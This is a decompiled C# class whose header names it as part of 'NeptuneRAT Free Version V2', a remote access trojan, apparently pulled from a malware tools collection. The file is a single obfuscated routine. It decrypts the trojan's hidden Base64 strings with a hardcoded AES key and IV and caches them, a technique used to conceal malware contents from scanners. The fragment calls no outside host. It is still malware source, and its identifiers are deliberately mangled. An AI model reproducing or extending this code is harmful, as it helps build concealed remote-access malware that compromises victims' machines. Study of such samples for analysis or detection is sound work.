// Decompiled with JetBrains decompiler
// Type: ⚔️MasonRAT✌ڙـ؉ټــ،ٺ؍؊؉؉؁ڼ
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

#nullable disable
public class \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ
{
  public static string ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ([In] string[] obj0, [In] int obj1)
  {
    string str = string.Empty;
    if (\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.دٻ\u060B\u060Dئڙ\u060Dڙ\u060Fـ\u0609ءـ\u060Fــ\u0608\u060Bٽ == null)
      \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.دٻ\u060B\u060Dئڙ\u060Dڙ\u060Fـ\u0609ءـ\u060Fــ\u0608\u060Bٽ = new Dictionary<string, string>();
    if (typeof (\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ).Module.Assembly != (Assembly) null)
    {
      lock (\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.دٻ\u060B\u060Dئڙ\u060Dڙ\u060Fـ\u0609ءـ\u060Fــ\u0608\u060Bٽ)
      {
        if (\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.دٻ\u060B\u060Dئڙ\u060Dڙ\u060Fـ\u0609ءـ\u060Fــ\u0608\u060Bٽ.ContainsKey(obj0[obj1]))
        {
          str = \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.دٻ\u060B\u060Dئڙ\u060Dڙ\u060Fـ\u0609ءـ\u060Fــ\u0608\u060Bٽ[obj0[obj1]];
        }
        else
        {
          Aes aes = Aes.Create();
          aes.Key = Encoding.UTF8.GetBytes("TykKwTgXDYxoJLzxiEowuXpVuSHQoVBH");
          aes.IV = Encoding.UTF8.GetBytes("QAsnkAnOVowrDlno");
          ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);
          using (MemoryStream memoryStream = new MemoryStream(Convert.FromBase64String(obj0[obj1])))
          {
            using (CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, decryptor, CryptoStreamMode.Read))
            {
              using (StreamReader streamReader = new StreamReader((Stream) cryptoStream))
                str = streamReader.ReadToEnd();
            }
          }
          \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.دٻ\u060B\u060Dئڙ\u060Dڙ\u060Fـ\u0609ءـ\u060Fــ\u0608\u060Bٽ[obj0[obj1]] = str;
        }
      }
    }
    return str;
  }
}
